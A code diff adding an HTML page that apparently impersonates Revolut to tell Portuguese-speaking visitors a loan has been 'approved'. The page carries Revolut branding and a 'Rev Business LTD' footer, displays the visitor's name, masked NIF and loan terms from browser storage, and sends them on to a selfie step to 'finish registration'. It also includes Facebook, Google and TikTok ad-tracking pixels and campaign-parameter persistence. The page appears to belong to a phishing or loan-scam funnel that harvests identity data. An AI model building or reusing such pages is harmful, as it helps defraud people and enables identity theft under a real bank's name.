@@ -1,0 +1,238 @@
+<!DOCTYPE html><html lang="pt-PT"><head>
+<script>
+(function(){
+  var UTM_KEYS=['src','sck','utm_source','utm_campaign','utm_medium','utm_content','utm_term','fbclid','ttclid','gclid','gbraid','wbraid','click_id','CampaignID']; window.TRACKING_KEYS=UTM_KEYS;
+  var p=new URLSearchParams(window.location.search);
+  UTM_KEYS.forEach(function(k){ if(p.get(k)) localStorage.setItem(k,p.get(k)); });
+  var changed=false;
+  UTM_KEYS.forEach(function(k){ var v=localStorage.getItem(k); if(v&&!p.has(k)){p.set(k,v);changed=true;} });
+  if(changed) history.replaceState(null,'','?'+p.toString());
+  document.addEventListener('click',function(e){
+    var a=e.target.closest('a');
+    if(a&&a.href){ try{ var u=new URL(a.href,window.location.href); UTM_KEYS.forEach(function(k){ var v=localStorage.getItem(k); if(v&&!u.searchParams.has(k)) u.searchParams.set(k,v); }); a.href=u.toString(); }catch(ex){} }
+  },true);
+})();
+</script>
+<script>
+function redirectWithParams(destination) {
+const currentParams = window.location.search;
+if (!currentParams) {
+window.location.href = destination;
+return;
+}
+
+if (destination.includes("?")) {
+window.location.href = destination + "&" + currentParams.substring(1);
+} else {
+window.location.href = destination + currentParams;
+}
+}
+</script>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Empréstimo aprovado — Revolut</title>
+<link rel="icon" href="images/revolut-favicon.svg">
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{background:#f3f4f6;color:#0a0a0a;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased}
+  .wrap{max-width:480px;margin:0 auto;min-height:100vh;display:flex;flex-direction:column;background:#f3f4f6}
+
+  .topbar{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;background:#fff;border-bottom:1px solid #eee}
+  .menu-btn{width:36px;height:36px;border-radius:10px;background:#f1ecff;display:flex;align-items:center;justify-content:center;border:0}
+  .menu-btn span{display:block;width:14px;height:2px;background:#0a0a0a;position:relative}
+  .menu-btn span::before,.menu-btn span::after{content:"";position:absolute;left:0;width:14px;height:2px;background:#0a0a0a}
+  .menu-btn span::before{top:-5px}.menu-btn span::after{top:5px}
+  .brand{font-weight:800;font-size:22px;letter-spacing:-0.5px;margin-left:10px;flex:1}
+  .user-block{display:flex;align-items:center;gap:10px}
+  .user-info{text-align:right;line-height:1.1}
+  .user-info .name{font-size:13px;font-weight:600;text-transform:capitalize}
+  .user-info .nif{font-size:11px;color:#9ca3af;letter-spacing:1px}
+  .avatar{width:34px;height:34px;border-radius:50%;border:1.5px solid #0a0a0a;display:flex;align-items:center;justify-content:center}
+  .avatar svg{width:18px;height:18px}
+
+  .card{margin:16px;background:#fff;border-radius:22px;padding:24px 20px;box-shadow:0 1px 2px rgba(0,0,0,.04)}
+
+  .hero{display:flex;justify-content:center;margin-bottom:14px;position:relative}
+  .hero-circle{width:90px;height:90px;border-radius:50%;background:#fff;border:1px solid #ececf0;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 18px rgba(124,58,237,.10);position:relative}
+  .hero-circle svg{width:36px;height:36px;color:#0a0a0a}
+  .hero .dot{position:absolute;border-radius:50%}
+  .hero .d1{width:8px;height:8px;background:#0a0a0a;top:6px;left:50%;margin-left:-4px}
+  .hero .d2{width:7px;height:7px;background:#0a0a0a;top:22px;left:50%;margin-left:30px}
+  .hero .d3{width:9px;height:9px;background:#a5f3fc;bottom:8px;left:50%;margin-left:34px}
+  .hero .d4{width:9px;height:9px;background:#c7d2fe;top:30px;left:50%;margin-left:-46px}
+  .hero .d5{width:7px;height:7px;background:#a5f3fc;bottom:14px;left:50%;margin-left:-42px}
+
+  h1{text-align:center;font-size:24px;font-weight:800;letter-spacing:-.6px;text-transform:capitalize}
+  .sub{text-align:center;font-size:14px;font-weight:600;color:#7c3aed;margin-top:4px}
+  .lead{text-align:center;font-size:13px;color:#52525b;margin-top:6px;margin-bottom:18px}
+
+  .libertado{background:linear-gradient(180deg,#eef2ff 0%,#f5f3ff 100%);border-radius:18px;padding:18px 16px;text-align:center;margin-bottom:14px}
+  .libertado .lab{font-size:11px;font-weight:700;letter-spacing:1.5px;color:#0a0a0a}
+  .libertado .val{font-size:30px;font-weight:800;letter-spacing:-1px;margin:6px 0 4px}
+  .libertado .way{font-size:12px;color:#52525b;display:inline-flex;align-items:center;gap:6px}
+  .libertado .way svg{width:13px;height:13px;color:#71717a}
+
+  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px}
+  .mini{background:#fff;border:1px solid #ececf0;border-radius:16px;padding:14px;text-align:center}
+  .mini .ico{width:36px;height:36px;border-radius:10px;background:#f5f3ff;display:flex;align-items:center;justify-content:center;margin:0 auto 8px}
+  .mini .ico svg{width:18px;height:18px;color:#7c3aed}
+  .mini .lab{font-size:10px;font-weight:700;letter-spacing:1.2px;color:#71717a}
+  .mini .v{font-size:17px;font-weight:800;margin-top:6px;letter-spacing:-.3px}
+
+  .primeira{background:#fff;border:1px solid #ececf0;border-radius:16px;padding:14px;display:flex;align-items:center;gap:12px;margin-bottom:14px}
+  .primeira .ico{width:38px;height:38px;border-radius:50%;background:#f3f4f6;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+  .primeira .ico svg{width:18px;height:18px;color:#52525b}
+  .primeira .body{flex:1;text-align:center}
+  .primeira .lab{font-size:10px;font-weight:700;letter-spacing:1.2px;color:#71717a}
+  .primeira .v{font-size:17px;font-weight:800;margin-top:4px}
+  .primeira .hint{font-size:11px;color:#7c3aed;margin-top:2px}
+
+  .cta{width:100%;background:#0a0a0a;color:#fff;border:0;border-radius:16px;padding:16px;font-size:15px;font-weight:700;display:flex;align-items:center;justify-content:center;gap:10px;cursor:pointer;font-family:inherit}
+  .cta:active{transform:scale(.99)}
+  .cta svg{width:18px;height:18px}
+  .lock{text-align:center;font-size:11px;color:#71717a;margin-top:10px;display:flex;align-items:center;justify-content:center;gap:5px}
+  .lock svg{width:11px;height:11px}
+</style>
+<script>
+  window.pixelId = "6a5594cf5757aed4584adce8";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  window.googlePixelId = "6a45c62144ce1832379750fa";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+  document.head.appendChild(a);
+</script>
+
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+  window.tikTokPixelId = "6a5593d07d9a2ac947099389";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  window.va = window.va || function () { (window.vaq = window.vaq || []).push(arguments); };
+</script>
+<script defer="" src="js/script.js"></script>
+
+<style id="legal-footer-style">
+  .legal-footer{width:100%;max-width:760px;margin:22px auto 0;padding:18px 16px 26px;text-align:center;color:#6b7280;font-size:11.5px;line-height:1.55}
+  .legal-footer__company{font-weight:700;color:#111827;margin-bottom:2px}
+  .legal-footer__links{display:flex;justify-content:center;gap:12px;flex-wrap:wrap;margin-top:8px}
+  .legal-footer__links a{color:#111827;text-decoration:underline;text-underline-offset:3px}
+</style>
+  <script src="js/tracking.js" data-project="revoopt-blue-one" defer=""></script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <button class="menu-btn" aria-label="menu"><span></span></button>
+    <div class="brand"><img src="images/revolut-logo.svg" alt="Revolut" style="height:28px;width:auto;display:block;"></div>
+    <div class="user-block">
+      <div class="user-info">
+        <div class="name" id="userName">cliente</div>
+        <div class="nif" id="userNif">*** *** ***</div>
+      </div>
+      <div class="avatar"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M16 14a4 4 0 10-8 0M12 12a4 4 0 100-8 4 4 0 000 8z" stroke-linecap="round" stroke-linejoin="round"></path><path d="M4 21c1.5-3.5 4.5-5 8-5s6.5 1.5 8 5" stroke-linecap="round" stroke-linejoin="round"></path></svg></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="hero">
+      <span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="dot d4"></span><span class="dot d5"></span>
+      <div class="hero-circle"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M5 12l5 5L20 7" stroke-linecap="round" stroke-linejoin="round"></path></svg></div>
+    </div>
+    <h1>Parabéns, <span id="firstName">cliente</span>!</h1>
+    <div class="sub">Empréstimo aprovado 🎉</div>
+    <div class="lead">O valor já está reservado para si.</div>
+
+    <div class="libertado">
+      <div class="lab">VALOR LIBERTADO</div>
+      <div class="val" id="valorLib">€ 0,00</div>
+      <div class="way"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M3 21h18M5 21V10m14 11V10M3 10l9-6 9 6M9 21v-6h6v6" stroke-linecap="round" stroke-linejoin="round"></path></svg>Recebimento via IBAN</div>
+    </div>
+
+    <div class="grid2">
+      <div class="mini">
+        <div class="ico"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9" stroke-linecap="round"></circle><path d="M14 9a2 2 0 00-2-1.5c-1.4 0-2 .9-2 1.8 0 2.5 4 1.5 4 4 0 1-1 1.8-2 1.8a2 2 0 01-2-1.5M12 6v1.5M12 16v1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg></div>
+        <div class="lab">PRESTAÇÃO MENSAL</div>
+        <div class="v" id="prestacaoMensal">€ 0,00</div>
+      </div>
+      <div class="mini">
+        <div class="ico"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="3" y="5" width="18" height="16" rx="2"></rect><path d="M3 9h18M8 3v4M16 3v4" stroke-linecap="round"></path></svg></div>
+        <div class="lab">PRESTAÇÕES</div>
+        <div class="v" id="prestacoesQtd">0x</div>
+      </div>
+    </div>
+
+    <div class="primeira">
+      <div class="ico"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"></circle><path d="M12 7v5l3 2" stroke-linecap="round" stroke-linejoin="round"></path></svg></div>
+      <div class="body">
+        <div class="lab">PRIMEIRA PRESTAÇÃO</div>
+        <div class="v" id="primeiraData">03/08/2026</div>
+        <div class="hint" id="primeiraHint">30 dias para começar a pagar!</div>
+      </div>
+    </div>
+
+    <button class="cta" onclick="redirectWithParams('selfie.html')">Finalizar registo <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M5 12h14M13 5l7 7-7 7" stroke-linecap="round" stroke-linejoin="round"></path></svg></button>
+    <div class="lock"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="5" y="11" width="14" height="9" rx="2"></rect><path d="M8 11V8a4 4 0 018 0v3" stroke-linecap="round"></path></svg>Complete o seu registo para aceder à sua conta</div>
+  </div>
+</div>
+
+<script>
+(function(){
+  var nome = (localStorage.getItem('nome') || 'cliente').trim();
+  var p = nome.split(/\s+/);
+  var first = (p[0]||'cliente').toLowerCase();
+  var last  = (p.slice(-1)[0]||'').toLowerCase();
+  document.getElementById('userName').textContent = first + (last && last!==first ? ' '+last : '');
+  document.getElementById('firstName').textContent = first;
+
+  var nif = (localStorage.getItem('nif') || '').replace(/\D/g,'');
+  if(nif.length>=9) document.getElementById('userNif').textContent = nif.slice(0,3)+' *** *'+nif.slice(7,9);
+
+  var fmtEUR = function(n){ return '€ ' + (+n).toLocaleString('de-DE',{minimumFractionDigits:2,maximumFractionDigits:2}); };
+  var valor = +(localStorage.getItem('valorEmprestimo')||0);
+  var parcelas = +(localStorage.getItem('parcelas')||0);
+  var valorParcela = +(localStorage.getItem('valorParcela')||0);
+
+  document.getElementById('valorLib').textContent = fmtEUR(valor);
+  document.getElementById('prestacaoMensal').textContent = fmtEUR(valorParcela);
+  document.getElementById('prestacoesQtd').textContent = parcelas + 'x';
+
+  // primeira prestação
+  var quando = (localStorage.getItem('primeiraPrestacao')||'').toLowerCase();
+  var dias = 30, hintTxt = '30 dias para começar a pagar!';
+  if(quando.indexOf('próximo')>-1 || quando.indexOf('proximo')>-1){ dias = 30; hintTxt='no próximo mês'; }
+  else if(quando.indexOf('30')>-1){ dias = 30; hintTxt='30 dias para começar a pagar!'; }
+  else if(quando.indexOf('60')>-1){ dias = 60; hintTxt='60 dias para começar a pagar!'; }
+  else if(quando.indexOf('90')>-1){ dias = 90; hintTxt='90 dias para começar a pagar!'; }
+
+  var d = new Date(); d.setDate(d.getDate()+dias);
+  var dd = ('0'+d.getDate()).slice(-2)+'/'+('0'+(d.getMonth()+1)).slice(-2)+'/'+d.getFullYear();
+  document.getElementById('primeiraData').textContent = dd;
+  document.getElementById('primeiraHint').textContent = hintTxt;
+})();
+</script>
+
+<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'sxb1plzcpnl503952'},{'dcenter':'sxb1'},{'cp_id':'10972497'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src="js/scc-c2.min.js"></script>
+
+<div class="legal-footer">
+  <div class="legal-footer__company">Rev Business LTD</div>
+  <div>Avenida da Liberdade, 110, 1269-046 Lisboa, Portugal</div>
+  <div class="legal-footer__links">
+    <a href="termos-de-uso.html">Termos de Uso</a>
+    <a href="politica-de-privacidade.html">Política de Privacidade</a>
+  </div>
+</div>
+
+</body></html>
